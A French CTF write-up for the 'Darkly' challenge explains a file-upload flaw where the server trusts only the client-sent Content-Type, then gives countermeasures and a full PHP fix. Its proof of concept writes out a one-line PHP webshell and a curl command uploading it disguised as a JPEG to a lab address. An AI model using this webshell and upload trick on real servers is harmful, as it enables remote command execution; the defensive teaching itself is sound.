# Darkly — README : Vulnérabilité d’upload de fichiers (validation du Content-Type insuffisante)

## Objectif
Expliquer le fonctionnement de l’exploit, la nature de la faille et les mesures de protection à appliquer.

**Contexte :** page `index.php?page=upload` acceptant des fichiers images, mais ne validant que l’en-tête `Content-Type` fourni par le client.

---

## 1) Résumé
Sur la page d’upload, le serveur **ne vérifie que le `Content-Type` envoyé par le client** (ex. `image/jpeg`). En falsifiant cet en‑tête lors de l’envoi, il est possible de téléverser un fichier PHP (`.php`) en le déclarant comme une image. Le fichier est accepté et un message de succès est renvoyé. Dans le cadre du CTF, la page retourne ensuite la flag, prouvant l’exploitation.

> Remarque : dans l’environnement observé, l’upload acceptait le `.php` déguisé, mais le serveur web ne l’exécutait pas (répertoire non interprété par PHP). Le challenge délivrait néanmoins la flag dès l’upload.

---

## 2) Preuve de concept (PoC)

```bash
# Créer un fichier PHP de test
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

# Envoyer le fichier en forçant le Content-Type à image/jpeg
curl -X POST   -F "Upload=Upload"   -F "uploaded=@/tmp/shell.php;type=image/jpeg"   "http://192.168.64.3/index.php?page=upload"
```

**Résultat typique :**
```
/tmp/shell.php succesfully uploaded.
```

Sur des configurations vulnérables, l’étape suivante consisterait à accéder à  
`http://TARGET/images/shell.php?cmd=id` pour obtenir une exécution de commandes.

---

## 3) Explication technique — nature de la faille

### Description
Le serveur décide si un fichier est autorisé **uniquement** à partir du `Content-Type` fourni par le client (`$_FILES['uploaded']['type']`). Or cet en‑tête est **contrôlable côté client** (curl, Burp, etc.) et peut être falsifié.

### Pourquoi c’est dangereux
- Le `Content-Type` est **forgeable** et ne prouve rien sur le contenu réel.
- Si le fichier est stocké dans un répertoire **accessible et exécutable**, l’attaquant peut obtenir une **RCE** via un webshell.
- Même sans exécution, un upload non restreint permet phishing, hébergement de malware, ou attaques par saturation.

### Causes fréquentes
- Absence de vérification du type réel (magic bytes / `finfo`).
- Confiance dans `$_FILES['...']['type']`.
- Conservation du nom fourni par l’utilisateur sans sanitation.
- Stockage dans le webroot sans restrictions d’exécution.

---

## 4) Impact
- Dépôt d’un webshell → **RCE** potentielle.
- Fuite d’informations, persistance, pivoting.
- Compromission du serveur web si l’exécution est possible.

---

## 5) Contre‑mesures recommandées (défense en profondeur)

### 1) Vérifier le type réel du fichier
```php
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime = $finfo->file($_FILES['uploaded']['tmp_name']);
$allowed = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($mime, $allowed, true)) {
    die('Invalid file type');
}
```

### 2) Renommer systématiquement les fichiers
- Générer un nom serveur (UUID / hash).
- Forcer l’extension cohérente avec le type réel.

### 3) Stocker hors du webroot
- Ex. `/var/uploads/`, servir via un script si nécessaire.

### 4) Interdire l’exécution dans le dossier d’uploads
**Apache (exemple) :**
```
<FilesMatch "\.(php|php5|phtml)$">
    Require all denied
</FilesMatch>
```

### 5) Valider taille et quotas
- Vérifier `$_FILES['uploaded']['size']`.
- Configurer `upload_max_filesize` et `post_max_size`.

### 6) Vérifier les signatures (magic bytes)
- `exif_imagetype()`, `getimagesize()`, etc.

### 7) Journalisation et surveillance
- Logger les uploads.
- Alerter sur tentatives suspectes.

### 8) Principe du moindre privilège
- Permissions strictes (0644), utilisateur non privilégié, aucune exécution.

---

## 6) Checklist de détection
- [ ] L’upload accepte `file.php;type=image/jpeg` → **Échec** si oui
- [ ] Le fichier est accessible via GET → **Échec** si oui
- [ ] Renommage + stockage hors webroot → **Succès attendu**
- [ ] Vérification via `finfo` / signatures → **Succès attendu**

---

## 7) Exemple de correctif complet (PHP)

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploaded'])) {
    if ($_FILES['uploaded']['error'] !== UPLOAD_ERR_OK) die('Upload error');

    $maxBytes = 100 * 1024; // 100 KB
    if ($_FILES['uploaded']['size'] > $maxBytes) die('File too large');

    $finfo = new finfo(FILEINFO_MIME_TYPE);
    $mime = $finfo->file($_FILES['uploaded']['tmp_name']);
    $allowed = [
        'image/jpeg' => '.jpg',
        'image/png'  => '.png',
        'image/gif'  => '.gif',
    ];
    if (!isset($allowed[$mime])) die('Invalid file type');

    $filename = bin2hex(random_bytes(16)) . $allowed[$mime];
    $uploadDir = '/var/uploads/'; // hors webroot
    $dest = $uploadDir . $filename;

    if (!move_uploaded_file($_FILES['uploaded']['tmp_name'], $dest)) die('Unable to save file');

    chmod($dest, 0644);
    echo "Uploaded OK (id: $filename)";
}
```

---

## 8) Conclusion
- Ne jamais faire confiance aux en‑têtes envoyés par le client.
- *Upload non contrôlé + stockage dans le webroot* = risque élevé de **RCE**.
- Corriger via validations serveur (type réel, taille), renommage, stockage hors webroot et blocage de l’exécution.

*À utiliser uniquement dans des environnements de test ou avec autorisation.*
